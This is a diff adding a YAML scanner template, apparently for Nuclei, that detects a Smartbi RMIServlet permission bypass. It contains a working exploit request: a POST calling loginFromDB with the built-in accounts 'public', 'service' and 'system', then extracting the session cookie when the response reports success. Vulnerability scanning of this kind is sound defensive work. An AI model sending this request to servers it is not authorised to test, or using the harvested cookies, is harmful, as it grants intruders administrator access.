@@ -1,0 +1,39 @@
+id: smartbi-rmiservlet-permission-bypass
+info:
+  name: Smartbi RMIServlet Permission Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Smartbi RMIServlet interface allows attackers to bypass permissions and obtain administrator or higher privileges, enabling core operations.
+  reference:
+    - https://mp.weixin.qq.com/s/-lAW74Nwc9KwOD6sp_4-AA
+  classification:
+    cvss-score: 8.0
+
+http:
+  - raw:
+      - |
+        POST /smartbi/vision/RMIServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=UserService&methodName=loginFromDB&params=["{{username}}","0a"]
+    payloads:
+      username:
+        - public
+        - service
+        - system
+    attack: pitchfork
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"result":true'
+    extractors:
+      - type: kval
+        kval:
+          - "Set-Cookie"
